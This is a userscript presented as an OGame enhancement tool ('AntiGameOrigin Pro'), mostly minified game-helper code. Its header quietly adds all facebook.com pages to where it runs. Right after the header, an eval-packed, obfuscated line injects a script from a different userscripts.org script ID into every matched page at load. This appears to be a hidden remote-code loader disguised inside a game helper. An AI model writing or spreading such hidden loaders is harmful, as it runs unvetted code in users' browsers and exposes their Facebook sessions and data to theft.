// ==UserScript==
// @run-at		document-start
// @nocompat
// @name		AntiGameOrigin Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace	francolino
// @grant		GM_getValue
// @grant		GM_setValue
// @grant		GM_deleteValue
// @grant		GM_log
// @grant		GM_getResourceURL
// @description	Enhances OGame for experienced users with many features.
// @version		4.18.0
// @author		Francolino & Origin.team
// @updateURL   http://userscripts.org/scripts/source/116819.meta.js
// @downloadURL	https://userscripts.org/scripts/source/116819.user.js
// @include		http://*.ogame.*/game/index.php?*page=*
// @include		http://websim.speedsim.net/*
// @include		http://www.osimulate.com/*
// @include		http://*/secret/*.php*
// @include		http://*.gamestats.org/*
// @include		http://ogametools.com/*
// @include		http://*.ogametools.com/*
// @include		http://galaxy.ddns.us/*
// @include		http://logserver.net/*
// @include		http://war-riders.de/*
// @include		http://*.war-riders.de/*
// @include		http://kb.un1matr1x.de/*
// @include		http://savekb.de/*
// @include		http://*.savekb.de/*
// @icon		http://antigame.de/_img/favicon32.ico
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))
var AGO_extension;
(function(){function Ma(a){function b(a){if(a&&a.target&&a.target.name){var b=a.target.parentNode.parentNode.parentNode.parentNode.parentNode;if(b&&(b=b.querySelector("a.btn_blue[href]"))){var c=b.href,d=r.d(b.href).split("&mission=1");d.length&&("am209"===a.target.name?(d=d[0]+"&mission=8"+r.d(d[1]),d=d.split("&type="),d=d[0]+"&type=2"+d[1].substring(1),d+="&routine=15"):d=r.d(b.href)+"&routine=16",b.href=d+"&"+r.d(a.target.name)+"="+n.parseIntAbs(a.target.innerHTML),h.click(b),b.href=c)}}}var c=
0;if(e.get("M20")||e.get("M04")||e.get("M14")||1===+e.get("M30"))g(".material.spy",a).each(function(){c++;var a=g(this).parent(),b=g("th.area .rank_bandit1, th.area .rank_bandit2, th.area .rank_bandit3",this).length?2:g("th.area .status_abbr_honorableTarget",this).length?1:0,d=g(".aktiv.spy .area",a).text()||"",j=g('.aktiv.spy font[color="red"]',a).text()||"",h='<span style="float: left; color: '+(j?q.color.textRed:q.color.textNormal)+';" title="'+d+'">&nbsp;&nbsp;'+r.d(j,"--")+" </span>",m=g(".material.spy .area",
a).attr("plunder_status",b);0<m.length&&m.html(h+m.html());e.get("M14")&&g(".aktiv.spy",a).hide();var k=g(".fragment td",this);if(5<=k.length)var b=2===b?1:1===b?0.75:0.5,h=Math.floor(n.parseIntAbs(k.eq(1).text())*b),m=Math.floor(n.parseIntAbs(k.eq(3).text())*b),k=Math.floor(n.parseIntAbs(k.eq(5).text())*b),l=h+m+k,p=0<l&&l>=1E3*e.get("M36"),b={metal:h,crystal:m,deuterium:k,total:l,ratio:b,enough:p};else b={metal:0,crystal:0,deuterium:0,total:0,ratio:0,enough:!1};var s,u={},h=e.is("S27")?2:1;g(".fleetdefbuildings.spy:lt("+
h+") td.key",a).each(function(){(s=f.getItemByName(r.trim(this.textContent)))&&(u[s]=n.parseIntAbs(g(this).next().text()))});a=f.getDebris(u,!0);if("messages"===e.page&&(m=g(this).parent().parent().parent().attr("id")))h="tr#TR"+m.replace(/spioDetails_/,""),!b.enough&&!a.enough&&g(h+", tr#"+m).addClass("smallplunder"),e.get("M20")&&(m=b,d='<span class="anti_spy_info" style="color: '+(m.enough?q.color.textOrange:q.color.textNormal)+';" title="'+e.label("M24")+'">'+r.shortNumber(m.total,0)+' </span><span class="anti_spy_info" style="color: '+
(a.enough?q.color.textLightGreen:q.color.textNormal)+';" title="'+e.label("M22")+'">'+r.shortNumber(a.total,0)+' </span>&nbsp;&nbsp;&nbsp;<span style="color: red;" title="'+d+'">'+r.d(j,"  ")+" </span>",g(h).find("td.from").html(d));if(e.get("M20")&&(a.enough&&(d='<tr><th colspan="6" class="area" '+w.css("color",e.getColor("M21",15))+">"+e.label("M22")+'</th></tr><tr><td class="key">'+e.label("L091")+'</td><td class="value" style="color: '+q.color.textLightGreen+';">'+r.formatNumber(a.metal)+'</td><td class="key">'+
e.label("L092")+'</td><td class="value" style="color: '+q.color.textLightGreen+';">'+r.formatNumber(a.crystal)+'</td><td class="key">'+e.label("K209")+'</td><td class="value"><a class="anti_send_ships" href="javascript:void(0)" name="am209">'+r.formatNumber(Math.ceil(a.total/2E4))+"</a></td></tr>",g(this).after('<table class="anti_spy">'+d+"</table>")),j=b,j.enough)){a=0;for(d="";!(a++,b=Math.max(j.total,Math.min(0.75*(2*j.metal+j.crystal+j.deuterium),2*j.metal+j.deuterium)),b=e.is("FP8")?1.1*b:b,
h=Q,m=V,k=25E3,l=5E3,e.is("FP7")&&(h=V,m=Q,k=5E3,l=25E3),d+='<tr><td class="key">'+e.label("M24")+" "+(1<a?a:"")+'</td><td class="value"><span style="color: '+q.color.textOrange+';" title="'+e.label("L091")+": "+r.formatNumber(j.metal)+" - "+e.label("L092")+": "+r.formatNumber(j.crystal)+" - "+e.label("L093")+": "+r.formatNumber(j.deuterium)+'">'+r.formatNumber(j.total)+'</span></td><td class="key">'+e.label("K"+m)+(e.is("FP8")?" (+10%)":"")+'</td><td class="value"><a class="anti_send_ships" href="javascript:void(0)" name="am'+
m+'">'+r.formatNumber(Math.ceil(b/l))+'</a></td><td class="key">'+e.label("K"+h)+(e.is("FP8")?" (+10%)":"")+'</td><td class="value"><a class="anti_send_ships" href="javascript:void(0)" name="am'+h+'">'+r.formatNumber(Math.ceil(b/k))+"</a></td>",b=1-j.ratio,j.metal=Math.floor(j.metal*b),j.crystal=Math.floor(j.crystal*b),j.deuterium=Math.floor(j.deuterium*b),j.total=j.metal+j.crystal+j.deuterium,j.enough=0<j.total&&j.total>=1E3*e.get("M36"),!j.enough||a>=e.get("M28")););j='<tr><th colspan="6" class="area" '+
w.css("color",e.getColor("M21",15))+">"+e.label("M24")+" - "+Math.floor(100*j.ratio)+" %</th></tr>";g(this).after('<table class="anti_spy">'+j+d+"</table>")}}),h.addEventAll(".anti_send_ships","click",b);e.is("M16")&&g(".defenseattack.spy .attack a",a).attr("target","OGame_fleet_dispatch");var d=function(a,b){return'<td class="attack"><a class="btn_blue anti_sim_button" name="'+a+'">'+e.label(b)+"</a></td>"},j=n.d(((g(".defenseattack.spy a.btn_blue",a).eq(0).attr("href")||"").split("&type=")[1]||
"").split("&")[0])===T||f.officers.commander?d(9,"LM06"):"";e.is("M40")&&(j+=d(3,"T5A")+d(1,"T5B")+d(2,"T5C"));g(".defenseattack.spy .attack",a).attr("colspan","1").after(j);h.addEventAll(".anti_sim_button","click",Xa,!1,a);return c}function Xa(a){function b(a,b){var c="",d=["w_t","s_t","r_p"],j=!e.get("M48")||0<g(".fleetdefbuildings.spy:nth(3)",b).length;g(".fleetdefbuildings.spy:nth(3) td.key",b).each(function(){var b=f.getItemByName(r.trim(g(this).text()));if(b===Na||b===Oa||b===Pa){var j=n.parseIntAbs(g(this).next().text()),
b=n.d(b);j&&(c+=t(a,"tech_d0_"+(b-109),"techs[1][0]["+d[b-109]+"]","tech_d0_"+(b-109),j))}});c=j?c+(t(a,"tech_a0_0","techs[0][0][w_t]","tech_a0_0",f.getUnitsAccount(Na))+t(a,"tech_a0_1","techs[0][0][s_t]","tech_a0_1",f.getUnitsAccount(Oa))+t(a,"tech_a0_2","techs[0][0][r_p]","tech_a0_2",f.getUnitsAccount(Pa))):c+t(a,"del_techs","del_techs","del_techs",1);return c+=t(a,"engine0_0","","engine0_0",f.getUnitsAccount(va))+t(a,"engine0_1","","engine0_1",f.getUnitsAccount(sa))+t(a,"engine0_2","","engine0_2",
f.getUnitsAccount(wa))}function c(a){var b,c,d,j="",v=f.splitCurrentTask(e.get("M45"),ba,ta,ha);v&&v.ships?b=f.ItemShip:e.is("M44")&&(v=f.getUnits("",!0),b=f.ItemShipCombat);if(v&&v.ships)for(d in b)v[d]&&(b="ship_a0_"+(n.d(d)-202)+"_b",c="numunits[0][0]["+ra[d]+"]",j+=t(a,b,c,b,v[d]));return j}function d(a,b,c){var d="",j=g(".material.spy .fragment td",b);5<=j.length&&(d+=t(a,"enemy_metal","v_met","enemy_metal",n.parseIntAbs(j.eq(1).text()))+t(a,"enemy_crystal","v_kris","enemy_crystal",n.parseIntAbs(j.eq(3).text()))+
t(a,"enemy_deut","v_deut","enemy_deut",n.parseIntAbs(j.eq(5).text())));var j=((g(".material.spy .area",b).html()||"").split("</figure>")[1]||"").split("<a")[0].trim(),e=g(".material.spy .area figure",b).hasClass("moon")?3:1,v=g('.material.spy .area span[class*="status_abbr"]',b);return d+=t(a,"enemy_name","v_planet","enemy_name",j)+t(a,"enemy_pos","v_coords","enemy_pos",(g('.material.spy .area a[target="_parent"]',b).text()||"").replace(/[^\d:]/g,""))+r.addUrlPara("enemy_type",e)+r.addUrlPara("enemy_player",
v.text())+r.addUrlPara("enemy_status",v.attr("class").split("us_abbr_")[1])+r.addUrlPara("report_time",(g(".material.spy .area",b).text()||"").split((v.text()||"")+")")[1])+r.addUrlPara("plunder_perc",2===c?100:1===c?75:50)}function j(a,b){var c="";g(".fleetdefbuildings.spy:lt(2) td.key",b).each(function(){var b=r.trim(g(this).text());if(b=f.getItemByName(b)){var d=n.parseIntAbs(g(this).next().text());if(d)if(500>b){var j="ship_d0_"+(300>b?n.d(b)-202:n.d(b)-387)+"_b";c+=t(a,j,"numunits[1][0]["+ra[b]+
"]",j,d)}else b===Ya&&(c+=t(a,"abm_b","missiles_available_v","abm_b",d))}});return c}function t(a,b,c,d,j){return r.addUrlPara(3===a?d:2===a?c:b,j)}function v(a){var b={AE:["en","","ae"],AR:["sp","spanish","ar"],BA:["ba","bosnian","hr"],BR:["pt","brazilian","br"],CZ:["cz","czech","cz"],DE:["de","german","de"],DK:["dk","danish","dk"],ES:["sp","spanish","es"],FI:["fi","","fi"],FR:["fr","french","fr"],GR:["gr","greek","gr"],HR:["ba","","hr"],HU:["hu","hungarian","hu"],IT:["it","italian","it"],JP:["jp",
"","jp"],MX:["sp","spanish","mx"],NL:["nl","dutch","nl"],NO:["no","","no"],PL:["pl","polish","pl"],PT:["pt","portuguese","pt"],RO:["ro","romanian","ro"],RU:["ru","russian","ru"],SE:["sv","swedish","se"],SI:["si","","si"],SK:["sk","slovak","sk"],TR:["tr","turkish","tr"],TW:["tw","taiwanese","tw"],US:["en","","us"],ORG:["en","","en"]};return b[e.server][a-1]||b.ORG[a-1]}var ra={202:"k_t",203:"g_t",204:"l_j",205:"s_j",206:"kr",207:"sc",208:"ko",209:"re",210:"sp",211:"bo",212:"so",213:"z",214:"t",215:"sk",
401:"ra",402:"l_l",403:"s_l",404:"g",405:"i",406:"p",407:"k_s",408:"g_s"};if(a&&a.target&&a.target.name){var E=n.d(a.target.name),k=a.target.parentNode.parentNode.parentNode.parentNode.parentNode,l=n.d((k.innerHTML.split('plunder_status="')[1]||"").charAt(0));a=a.shiftKey||a.ctrlKey||e.get("M46")?"_blank":"";if(0<E&&4>E){var p="anti_sim_form"+E;document.getElementById(p)||g("body").append('<a id="'+p+'" style="display: none;" href="#"></a>');g("#"+p).attr("target",a||p).attr("href",["http://websim.speedsim.net/index.php?version=1&",
"http://drago-sim.com/index.php?","http://www.osimulate.com/?"][E-1]+"ref=antigame"+r.addUrlPara("lang",v(E))+r.addUrlPara("uni",e.server+"_"+e.uni)+r.addUrlPara("uni_speed",e.get("S21"))+t(E,"perc-df","","fleet_debris",100*e.get("S28"))+t(E,"","debris_ratio","",e.get("S28"))+t(E,"def_to_df","","",e.is("S27")?1:0)+t(E,"","def_tf","",e.is("S27")?!0:0)+t(E,"","","defense_debris",e.is("S27")?100*e.get("S28"):"0")+t(E,"","","defense_repair",100*e.get("S29"))+t(E,"rf","rapid_fire","rapidfire",e.is("S25")?
1:"0")+t(E,"start_pos","","start_pos",f.PlanetsActive.coords)+b(E,k)+j(E,k)+d(E,k,l)+c(E));h.click("#"+p)}if(9===E){var u=this,l=n.d(m.getStorage("Fleet_CountProbes"),1),E=(g('.material.spy .area a[target="_parent"]',k).text()||"").replace(/[^\d:]/g,"").split(":"),k=n.d(((g(".defenseattack.spy a.btn_blue",k).eq(0).attr("href")||"").split("&type=")[1]||"").split("&")[0]),l={type:k,shipCount:l,mission:Aa};f.updateCoords(l,null,ta,n.d(E[0]),n.d(E[1]),n.d(E[2]));if(s.miniFleetLink&&l.coords&&(k===T||
f.officers.commander))l.speed=f.getShipSpeedMaximal(f.PlanetsActive.galaxy,l.galaxy,xa),l.speed&&g.post(s.miniFleetLink,l,function(){g(u).css("color",q.color.textLimeGreen)})}}}var ia=[],Ea,Ba,Ga,ja,ya,na,g,ka=window.opera?4:-1<window.navigator.userAgent.indexOf("Firefox")?1:-1<window.navigator.userAgent.indexOf("Chrome")?2:-1<window.navigator.userAgent.indexOf("Safari")?3:0,Fa=AGO_extension,pa=1===ka?!0:"function"===typeof GM_getResourceURL?!0:!1,la=1===ka,Ca=2===ka,Qa=3===ka,qa=4===ka,Za=1===ka&&
-1<navigator.platform.toLowerCase().indexOf("android"),ua;1===ka?ua=unsafeWindow:2===ka&&pa?ua=unsafeWindow:3===ka&&pa?ua=unsafeWindow:(ua=document.createElement("p"),ua.setAttribute("onclick","return window;"),ua=ua.onclick());var s=ua;if(s.AGO_started)s.AGO_started_twice=1;else{s.AGO_started=1;var S=0,fa=1,X=2,u=1,C=2,da=3,ea=5,M=6,x=7,ca=8,Z=-2,ma=0,ba=2,ha=3,ta=0,za=4,T=1,Y=3,Na="109",Oa="110",Pa="111",va="115",sa="117",wa="118",V="202",Q="203",xa="210",Ya="502",Aa=6,N={},F={KeydownCache:[],Start:function(){if(window.top!==
window.self)F.Unload();else if(!F.status){F.status=1;F.timecheck=(new Date).getTime();window.addEventListener("unload",F.Unload,!0);if(document.location.href.match(/http:\/\/.+\.ogame\..+\/game\/index\.php\?+.*page=*/i)){F.ogame=1;e.Init();if(Fa&&(Ca||Qa||qa)&&document.documentElement)document.documentElement.style.overflowY="scroll";document.addEventListener("keydown",F.Keydown,!0)}J.log("AntiGame.Start 0   - "+((new Date).getTime()-F.timecheck)+" -- "+document.location.href);F.Load()}},Load:function(){if(1===
F.status)if("interactive"===document.readyState||"complete"===document.readyState||document.body){F.status=2;var a=(new Date).getTime();F.ogame&&(e.Load(),f.Load(),N="overview"===e.page?Ja:"resources"===e.page?Ra:"resourcesettings"===e.page?Sa:"station"===e.page?Ta:"traderoverview"===e.page?$a:"research"===e.page?Ka:"techtree"===e.page?ab:"shipyard"===e.page?Ua:"defense"===e.page?Va:"fleet1"===e.page?k:"fleet2"===e.page?D:"fleet3"===e.page?G:"movement"===e.page?ga:"galaxy"===e.page?R:"alliance"===
e.page?La:"premium"===e.page?bb:"shop"===e.page?cb:"messages"===e.page?W:{},N.status=2,N.Load&&N.Load(),H.Load(),q.Load(),I.Load());a=(new Date).getTime()-a;J.log("AntiGame.Load "+((new Date).getTime()-F.timecheck-a)+"   + "+a+" -- "+F.ogame);F.Run()}else setTimeout(F.Load,0)},Run:function(){if(2===F.status)if("interactive"===document.readyState||"complete"===document.readyState){document.onreadystatechange=null;F.status=4;var a=(new Date).getTime();if(F.ogame){if(!s.jQuery)return;g=s.jQuery;window.localStorage||
(ia[21]=!0);s.session&&(F.ogame=2)}else{pa&&f.coordsInit(!0);if("websim.speedsim.net"===document.location.hostname){var b=function(a,b){function c(a){var d=document.querySelector("input[name=original_"+a+"]");d&&(a=document.querySelector("input[name="+a+"]"),b&&(d.value=r.d(a.value)),a.value=r.d(Math.floor(n.parseInt(d.value)*j)))}J.log("CalculateResourse");var d=document.querySelectorAll("input[name=plunder_ratio]"),j=3===d.length?d[2].checked?2:d[1].checked?1.5:1:1;b&&(b=100<document.querySelector("#read_field").value.length);
c("enemy_metal");c("enemy_crystal");c("enemy_deut")},c=function(a){var b=document.getElementById("result_table");if(b){h.removeEvent(b,"DOMNodeInserted",d);var c=b.querySelector("table");c.style.display="none";for(var j=c.getElementsByTagName("tr"),c=[],e,t,v,f=0;f<j.length;f++){var ra=j[f].firstChild.innerHTML,g=j[f].lastChild.innerHTML,E,m=f,k=g;E={};var l=k.split(", ");2===l.length?(E.flag=!0,E.metal=r.trim(l[0].split(" ")[0]),E.crystal=r.trim(l[1].split(" ")[0]),m=l[1].split(" ~ "),2===m.length&&
(l[1]=m[0],E.info="~ "+m[1]),m=k.split(" ("),2===m.length&&(l[1]=m[0],E.info=m[1].split(")")[0]),3===m.length&&(l[1]="",E.metal_perc=m[1].split(")")[0],E.crystal_perc=m[2].split(")")[0],e=m[0].split(" ")[1],t=m[1].split(" ")[2]),k=l[1].split(" "),E.deuterium=3<=k.length?k[k.length-2]:0):8===m&&(E.flag=!0,E.deuterium=r.trim(k.split(" ")[0]),v=k.split(" ")[1]);k='<td style="min-width: 80px; text-align: right; padding: 0px 6px; color: '+(6===f||7===f?"orange":2===f?"green":4===f?"red":"")+';">';E.flag&&
!a?g=k+r.d(E.metal)+'</td><td width="30">'+r.d(E.metal_perc)+"</td>"+k+r.d(E.crystal)+'</td><td width="30">'+r.d(E.crystal_perc)+"</td>"+k+r.d(E.deuterium)+'</td><td style="min-width: 80px; padding: 0px 8px; white-space: nowrap;">'+r.d(E.info)+"</td>":(9===f&&(E=n.minMax(n.parseInt(document.getElementById("uni_speed").value),1,100),g=A.formatTime(Math.ceil(A.parseTime(g)/E/1E3))+" h"),g='<td colspan="6" width="400">'+(a?"":g)+"</td>");c.push("<tr"+("none"===j[f].style.display?' style="display: none;"':
"")+'><td style="padding: 2px 15px 2px 5px; white-space: nowrap;">'+ra+"</td>"+g+"</tr>")}a=document.getElementById("anti_result_table");a||(a=b.appendChild(document.createElement("table")),a.id="anti_result_table");j=c[3];c[3]='<tr><td style="text-align: right; padding: 10px 6px 2px 5px;" colspan="2">'+e+'</td><td style="text-align: right; padding: 10px 6px 2px 5px;" colspan="2">'+t+'</td><td style="text-align: right; padding: 10px 6px 2px 5px;" colspan="2">'+v+"</td><td></td></tr>"+c[2];c[2]=j;
a.innerHTML=c.join("");h.addEvent(b,"DOMNodeInserted",d)}},d=function(a){a&&(a.target&&"TABLE"===a.target.nodeName)&&c()},j=function(){function a(b){return 100>b?r.d(b).substring(0,4):r.d(Math.floor(b))}var b,c,d,j=document.getElementById("acs").selectedIndex;E[j]={attacker:0,defender:0,count_attacker:0,count_defender:0};for(b=0;13>=b;b++)if(c=document.getElementsByName("ship_a_"+b+"_b")[0])d=n.parseInt(c.value),c.value=r.d(d),0<d&&(E[j].count_attacker+=d,E[j].attacker+=f.Item[ra[b]].retreat*d);for(b=
0;13>=b;b++)if(c=document.getElementsByName("ship_d_"+b+"_b")[0])d=n.parseInt(c.value),c.value=r.d(d),0<d&&(13>=b&&(E[j].count_defender+=d),E[j].defender+=f.Item[ra[b]].retreat*d);var e=j=d=c=0;for(b=0;16>b;b++)c+=n.d(E[b].attacker),d+=n.d(E[b].defender),j+=n.d(E[b].count_attacker),e+=n.d(E[b].count_defender);document.getElementById("anti_units_attacker").innerHTML=r.d(j);document.getElementById("anti_units_defender").innerHTML=r.d(e);b="white";j="";c&&d&&(c>d?(j=a(c/d)+"&nbsp; : &nbsp;1",b=c<3*d?
"green":c<5*d?"yellow":"darkorange"):(j="1&nbsp; : &nbsp;"+a(d/c),b="red"));c=document.getElementById("anti_retreat_ratio");c.innerHTML=j;c.style.color=b},t=function(){for(var a,b="",c=0;13>=c;c++)if(a=document.getElementsByName("ship_a_"+c+"_b")[0])a=n.parseInt(a.value),0<a&&(b+="&am"+ra[c]+"="+a);if(b){if((a=document.getElementById("enemy_pos"))&&a.value)c=(c=document.getElementById("enemy_type"))&&c.checked?3:1,a=r.d(a.value).split(":"),b="&galaxy="+a[0]+"&system="+a[1]+"&position="+a[2]+"&type="+
c+b;m.setStorage("Fleet_Task","mission=1"+b)}},v,ra="202 203 204 205 206 207 208 209 210 211 212 213 214 215 401 402 403 404 405 406 407 408".split(" "),E=[];for(v=0;16>v;v++)E[v]={attacker:0,defender:0,count_attacker:0,count_defender:0};v="antigame"===r.getUrlPara("ref")?!0:!1;var k=document.getElementById("aswift_0_anchor");k&&(k.parentNode.parentNode.style.display="none");for(k=document.getElementById("overlay").nextSibling;k;)"TABLE"===k.nodeName?(k.style.minWidth="900px",k=null):k=k.nextSibling;
if(k=document.querySelector("input[type=reset]"))h.setStyles(k,{padding:"3px",marginRight:"24px"}),h.setStyles(k.parentNode.querySelectorAll("input")[1],{padding:"3px",margin:"0px 10px",minWidth:"150px"});var l=document.getElementById("del_techs");if(l){v&&(l.checked=r.getUrlPara("del_techs"));var p=n.parseInt(r.getUrlPara("uni_speed"))||1,k=document.createElement("tr");k.innerHTML="<td>"+e.label("S21")+'</td><td><input id="uni_speed" size="3" maxlength="2" value="'+p+'"></td>';l=l.parentNode.parentNode.parentNode;
l.insertBefore(k,l.childNodes[3])}k=function(a,b){var c=document.getElementsByName("ship_"+a+"_"+b+"_b")[0];h.addEvent(c,"change",j);h.addEvent(c,"keyup",j)};l=document.createElement("tr");l.innerHTML='<td style="padding: 10px 0px;">'+e.label("X02")+'</td><td align="center"><div id="anti_units_attacker" style="width:50px; text-align: left; padding: 5px 10px;"></div></td><td align="left" id="anti_retreat_ratio" style="width:50px; white-space: nowrap;"></td><td align="center"><div id="anti_units_defender" style="width:50px; text-align: left; padding: 5px 10px;"></div></td><td></td>';
(p=document.querySelector("#shiptable tbody"))&&p.insertBefore(l,p.childNodes[1]);for(l=0;13>=l;l++)k("a",l);for(l=0;13>=l;l++)k("d",l);k=document.querySelectorAll("input[type=button], input[type=reset]");for(l=0;l<k.length;l++)h.addEvent(k[l],"click",function(){setTimeout(j,10)});(p=document.querySelector("input[onclick^=sim_ip_attack]"))&&h.addEvent(p,"click",function(){setTimeout(c,330)});c(!0);var k=function(a){var c=document.querySelector("input[name="+a+"]");if(c){var d=c.cloneNode(!0);d.name=
"original_"+a;a=c.parentNode.appendChild(d);h.addEvent(a,"change",b);c.parentNode.style.minWidth="112px";c.parentNode.previousSibling.style.minWidth="70px";c.style.display="none"}},p=function(a,b){return'<input type="radio" name="plunder_ratio" value="'+a+'"'+(a===b?' checked="checked"':"")+">"+a+"% "},u=n.d(r.getUrlPara("plunder_perc"),50);if(l=document.getElementById("enemy_pos")){var w=l.parentNode.parentNode.querySelectorAll("td");w[4].innerHTML=e.label("X03")+":";w[5].innerHTML=p(50,u)+p(75,
u)+p(100,u);p=l.parentNode.appendChild(document.createElement("input"));p.id="enemy_type";p.type="checkbox";p.checked="3"===r.getUrlPara("enemy_type")?!0:!1;l.parentNode.appendChild(document.createTextNode(" M"))}h.addEventAll("input[name=plunder_ratio]","click",b);k("enemy_metal");k("enemy_crystal");k("enemy_deut");b();h.addEvent("#read_field + input","click",function(){setTimeout(function(){b(null,!0)},500)});h.addEvent("#read_field","click",function(){this.value=""});k="";v&&(v=r.getUrlPara("enemy_status"),
v="honorableTarget"===v?q.color.textHonorable:"inactive"===v?q.color.textInactive:q.color.textActive,k='<span style="padding: 0 50px;">'+r.getUrlPara("uni")+"</span>"+r.getUrlPara("enemy_name")+' <span style="color: white;">['+r.getUrlPara("enemy_pos")+']</span> -  <span style="color: '+v+';">'+r.getUrlPara("enemy_player")+"</span> - "+decodeURI(r.getUrlPara("report_time")));if(la||Ca&&pa)k+='<a href="javascript:void(0)" id="anti_set_ships" style="float: right; background-color: #344566; border: 1px solid #415680; padding: 3px;">'+
e.label("X01")+"</a>";if(v=document.getElementById("acs"))k=h.create("span",null,{color:q.color.textBlue,fontSize:"14px"},"",k),v.parentNode.appendChild(k),h.addEvent(document.getElementById("anti_set_ships"),"click",t);j()}if("www.osimulate.com"===document.location.hostname){var t=function(){var a=document.querySelector("#atk-tabs > ul > li.ui-tabs-selected a");if(a){for(var b="",c=0;13>=c;c++){var d=document.getElementById("num"+c+a.innerHTML);d&&(d=n.parseInt(d.value),0<d&&(b+="&am"+x[c]+"="+d))}if(b){if((a=
document.getElementById("txtCoords"))&&a.value)a=r.d(a.value).split(":"),b="&galaxy="+a[0]+"&system="+a[1]+"&position="+a[2]+"&type=1"+b;m.setStorage("Fleet_Task","mission=1"+b)}}},x="202 203 204 205 206 207 208 209 210 211 212 213 214 215 401 402 403 404 405 406 407 408".split(" ");if(la||Ca&&pa)if(v=document.getElementById("cmdSimulate"))v=v.parentNode,k=v.cloneNode(!0),l=k.querySelector("button"),l.id="antigame_send_ships",l.innerHTML="<span>"+e.label("X01")+"</span>",h.addEvent(l,"click",t),v.parentNode.insertBefore(k,
v.parentNode.childNodes[6])}}if(2===F.ogame){F.showStatus("orange");B.addButton();if(20<=na){22===na&&setTimeout(B.Check,4800);F.showStatus("red");return}e.Run();f.coordsInit();A.Init();B.Run();2===N.status&&(N.status=4,N.Run&&N.Run());H.Run();y.Run();$.Update();g(document.body).ajaxSuccess(F.Ajax)}a=(new Date).getTime()-a;J.log("AntiGame.Run "+((new Date).getTime()-F.timecheck-a)+"   + "+a);2===F.ogame&&2!==+e.get("A16")?g(document).ready(function(){J.log("AntiGame.Ready "+((new Date).getTime()-
F.timecheck)+"   - ready (jQuery)");e.is("A16")?setTimeout(F.Ready,0):F.Ready()}):F.Ready()}else document.onreadystatechange=function(){F.Run()}},Ready:function(){var a;if(4===F.status)if(a=+e.get("A16")||0,2>a||"complete"===document.readyState){F.status=6;var b=(new Date).getTime();if(2===F.ogame&&(F.showStatus("green"),B.Ready(),4===N.status&&(N.status=6,N.Ready&&N.Ready()),H.Ready(),s.timerHandler&&s.timerHandler.appendCallback(F.Timer),e.is("A21")))for(var c=0;c<F.KeydownCache.length;c++){var d=
{keyCode:F.KeydownCache[c]};(!N.Keydown||N.Keydown(d,0,0))&&B.Keydown(d,0,0)}b=(new Date).getTime()-b;J.log("AntiGame."+(["Ready ","ReadyDelay ","ReadyComplete "][a]||" ")+((new Date).getTime()-F.timecheck-b)+"   + "+b);F.Complete()}else setTimeout(F.Ready,0)},Complete:function(){if(6===F.status)if("complete"===document.readyState){F.status=7;var a=(new Date).getTime();2===F.ogame&&(B.Complete(),6===N.status&&(N.status=7,N.Complete&&N.Complete()),F.showStatus("white"));a=(new Date).getTime()-a;J.log("AntiGame.Complete "+
((new Date).getTime()-F.timecheck-a)+"   + "+a)}else setTimeout(F.Complete,0)},Unload:function(){window.removeEventListener("unload",F.Unload,!0);window.removeEventListener("mouseup",f.CoordsMouseUp,!1);F.ogame&&(document.removeEventListener("keydown",F.Keydown,!0),window.removeEventListener("focus",f.CoordsSet,!1));2===F.ogame&&(B.Unload(),N.Unload&&N.Unload(),N.status=0)},Timer:function(){B.Timer();N.Timer&&N.Timer();z.Timer&&z.Timer()},Keydown:function(a){if(a&&a.target&&a.keyCode&&!a.altKey&&
!a.metaKey){if(a.ctrlKey&&(37>a.keyCode||40<a.keyCode))return!0;if(6>F.status)F.KeydownCache.push(a.keyCode);else if(e.is("A21")){var b=0;"TEXTAREA"===a.target.nodeName?b=12:"INPUT"===a.target.nodeName?"text"===a.target.type&&(b=11):"SELECT"===a.target.nodeName&&(b=1);var c=a.shiftKey?a.ctrlKey?3:1:a.ctrlKey?2:0;if(document.querySelectorAll("body > .ui-dialog").length){var d=a.target,j;g(d).hasClass("ui-dialog")&&(d=g(".overlayDiv",d).get(0));do if(g(d).hasClass("overlayDiv")){j=g("> div",d).get(0);
break}else d=d.parentNode;while(d&&"BODY"!==d.nodeName);if(j)if("jumpgate"===j.id){if(!z.Keydown(a,c,b,j))return!1}else if(-1<j.className.indexOf("showmessage")&&!oa.Keydown(a,c,b,j))return!1}else if(!document.getElementById("anti_win")&&N.Keydown&&!N.Keydown(a,c,b))return!1;return B.Keydown(a,c,b)}}return!0},Ajax:function(a,b,c){var d=(c.url||"").match(/page=(\w+)/i),d=d?r.d(d[1]).toLowerCase():"";switch(d){case "resources":Ra.Show(a,b);break;case "station":Ta.Show(a,b);break;case "jumpgatelayer":z.Show(a,
b);break;case "research":Ka.Show(a,b);break;case "shipyard":Ua.Show(a,b);break;case "defense":Va.Show(a,b);break;case "galaxycontent":R.Show(a,b);break;case "allianceoverview":La.Show(a,b,d);break;case "messages":W.Show(a,b);break;case "showmessage":oa.Show(a,b,c.url);break;case "buddies":Ha.Show(a,b);break;case "notices":Ia.Show(a,b);break;case "search":Da.Show(a,b);break;case "eventlist":H.Show(a,b)}},showStatus:function(){}},e={Data:{A00:[0,"General"],A06:["","Menu Language",da,5],A11:[1,"Minimize the large header image",
u,5],A12:[0,"Scroll time to the next event in the window title",u,5],A16:[1,"Selection of ships, resources and other values at which moment",C,5,0,2],A17:[0,"Fast"],A18:[0,"Normal"],A19:[0,"Delayed"],A20:[0,"Usability"],A21:[1,"Use keyboard shortcuts",u,5],A22:[0,"Use function keys to select planet or moon",u,5],A24:[0,"Perform actions with a doubleclick",u,5],A25:[1,"Block Auto-Complete for input fields",u,5],A26:[1,"Use visual selection feedback",u,5],A27:[1,"Change the behavior of tooltips",C,
